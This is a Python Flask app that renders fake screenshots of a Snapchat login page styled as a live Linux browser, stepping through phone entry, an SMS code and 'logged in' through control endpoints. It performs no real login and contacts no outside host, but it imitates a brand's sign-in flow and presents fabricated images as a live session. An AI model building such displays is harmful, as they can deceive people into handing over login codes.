import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

# Global state - this is your "live linux browser"
state = {
    'stage': 'login',           # login | phone_filled | logging_in | sms_sent | code_entered | done
    'update_count': 0,
    'typed_phone': '',
    'typed_code': '',
    'last_action': 'Browser ready',
    'address': 'https://accounts.snapchat.com/accounts/login'
}

# Try to use real playwright (will fail on Railway but works locally)
REAL_BROWSER = False
try:
    from playwright.sync_api import sync_playwright
    REAL_BROWSER = True
except:
    pass

def draw_browser_frame(draw, w, h, title="Snapchat - Login"):
    """Draw a realistic Linux browser window"""
    # Title bar (like Chrome on Linux)
    draw.rectangle([0, 0, w, 32], fill='#2d2d2d')
    draw.text((12, 8), "●  ●  ●", fill='#888888')
    draw.text((w//2 - 80, 8), title, fill='#cccccc')

    # Address bar
    draw.rectangle([60, 38, w-60, 62], fill='#1f1f1f', outline='#444')
    draw.text((70, 43), state.get('address', 'https://accounts.snapchat.com/accounts/login'), fill='#aaa')

    # Tabs hint
    draw.rectangle([8, 68, 120, 88], fill='#1a1a1a')
    draw.text((15, 70), "Login", fill='#ddd')

def generate_image():
    """Generates a realistic browser screenshot of the current state"""
    state['update_count'] += 1
    now = datetime.now().strftime("%H:%M:%S")

    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#1e1e1e')
    draw = ImageDraw.Draw(img)

    try:
        f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 22)
        f2 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
        f3 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
        f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
    except:
        f = f2 = f3 = f_small = ImageFont.load_default()

    # Draw browser chrome
    draw_browser_frame(draw, w, h)

    # Main content area (the actual Snapchat page)
    cx, cy = 200, 100
    draw.rounded_rectangle([cx, cy, cx+880, cy+540], radius=12, fill='#000000')

    # Snapchat header
    draw.rectangle([cx, cy, cx+880, cy+42], fill='#111111')
    draw.text((cx + 380, cy + 10), "Snapchat", fill='#FFFC00', font=f)

    # Login card
    card_x = cx + 220
    card_y = cy + 60
    draw.rounded_rectangle([card_x, card_y, card_x+440, card_y+430], radius=16, fill='#1f1f1f')
    draw.text((card_x + 18, card_y + 14), "Log in to Snapchat", fill='white', font=f2)

    stage = state['stage']

    if stage in ['login', 'phone_filled', 'logging_in', 'sms_sent']:
        # Phone login
        draw.text((card_x + 22, card_y + 50), "Enter your phone number", fill='#aaaaaa', font=f3)
        draw.rounded_rectangle([card_x+18, card_y+72, card_x+422, card_y+108], radius=8, fill='#2c2c2c')
        
        phone_text = state.get('typed_phone') or "+47 40300869"
        color = '#22c55e' if state.get('typed_phone') else '#888888'
        draw.text((card_x + 30, card_y + 80), phone_text, fill=color, font=f3)

        draw.text((card_x + 22, card_y + 118), "Norway", fill='#666666', font=f_small)

        # Log In button
        by = card_y + 155
        if stage in ['logging_in', 'sms_sent']:
            draw.rounded_rectangle([card_x+18, by, card_x+422, by+44], radius=22, fill='#444444')
            draw.text((card_x+145, by+12), "Logging in...", fill='#aaaaaa', font=f2)
        else:
            draw.rounded_rectangle([card_x+18, by, card_x+422, by+44], radius=22, fill='#FFFC00')
            draw.text((card_x+170, by+12), "Log In", fill='#000000', font=f2)

        if stage in ['sms_sent', 'logging_in']:
            # Big banner + SMS
            draw.rounded_rectangle([card_x+8, card_y+210, card_x+432, card_y+310], radius=10, fill='#3f2a00')
            draw.text((card_x+18, card_y+218), "PHONE NUMBER ENTERED", fill='#f59e0b', font=f)
            draw.text((card_x+18, card_y+246), "Log In button was clicked", fill='white', font=f2)
            draw.text((card_x+18, card_y+268), "Waiting for Snapchat SMS...", fill='#cccccc', font=f3)

            if state.get('typed_phone'):
                draw.text((card_x+18, card_y+288), f"✓ SMS sent to {state['typed_phone']}", fill='#22c55e', font=f_small)

            # SMS boxes
            draw.text((card_x+18, card_y+318), "Enter 6-digit code", fill='#60a5fa', font=f2)
            for i in range(6):
                x = card_x + 28 + i * 62
                draw.rounded_rectangle([x, card_y+342, x+54, card_y+380], radius=8, fill='#0f172a', outline='#3b82f6', width=3)
                if state.get('typed_code') and i < len(state['typed_code']):
                    draw.text((x+18, card_y+348), state['typed_code'][i], fill='white', font=f2)

    elif stage == 'code_entered':
        draw.rounded_rectangle([card_x+8, card_y+180, card_x+432, card_y+280], radius=10, fill='#052e16')
        draw.text((card_x+80, card_y+200), "✓ CODE ENTERED", fill='#22c55e', font=f)
        draw.text((card_x+60, card_y+235), "Verifying with Snapchat...", fill='white', font=f2)
        draw.text((card_x+40, card_y+260), "Please wait...", fill='#888888', font=f3)

    elif stage == 'done':
        draw.rounded_rectangle([card_x+8, card_y+180, card_x+432, card_y+280], radius=10, fill='#052e16')
        draw.text((card_x+100, card_y+210), "✓ LOGGED IN", fill='#22c55e', font=f)
        draw.text((card_x+70, card_y+250), "Session active", fill='white', font=f2)

    # Live status bar at bottom
    draw.rectangle([0, h-28, w, h], fill='#111111')
    draw.text((12, h-22), f"LIVE LINUX BROWSER  •  {now}  •  {state['last_action']}", fill='#22c55e', font=f_small)

    # Update counter
    draw.text((w-200, h-22), f"Frame #{state['update_count']}", fill='#666', font=f_small)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    return path

def screenshot_loop():
    while True:
        generate_image()
        time.sleep(0.85)

# === CONTROL ENDPOINTS (you control the "browser") ===
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/action', methods=['POST'])
def action():
    data = request.get_json() or {}
    action = data.get('action', '')

    if action == 'type_phone':
        state['typed_phone'] = data.get('value', '+47 40300869')
        state['stage'] = 'phone_filled'
        state['last_action'] = 'Typed phone number'
        generate_image()

    elif action == 'click_login':
        if state['typed_phone']:
            state['stage'] = 'sms_sent'
            state['last_action'] = 'Clicked Log In'
        else:
            state['typed_phone'] = '+47 40300869'
            state['stage'] = 'sms_sent'
            state['last_action'] = 'Clicked Log In (default phone)'
        generate_image()

    elif action == 'type_code':
        code = data.get('value', '')
        state['typed_code'] = code
        state['stage'] = 'code_entered'
        state['last_action'] = f'Typed code: {code}'
        generate_image()

    elif action == 'submit_code':
        if len(state.get('typed_code', '')) >= 4:
            state['stage'] = 'done'
            state['last_action'] = 'Code submitted'
        generate_image()

    elif action == 'reset':
        state.update({
            'stage': 'login',
            'typed_phone': '',
            'typed_code': '',
            'last_action': 'Browser reset'
        })
        generate_image()

    return jsonify({
        'ok': True,
        'stage': state['stage'],
        'last_action': state['last_action']
    })

@app.route('/screenshot')
def shot():
    generate_image()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def stat():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **state,
        'size': size,
        'real_browser_available': REAL_BROWSER
    })

@app.before_request
def boot():
    if not hasattr(app, 'booted'):
        app.booted = True
        generate_image()
        threading.Thread(target=screenshot_loop, daemon=True).start()
        print("[LIVE BROWSER] Linux browser simulation started")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
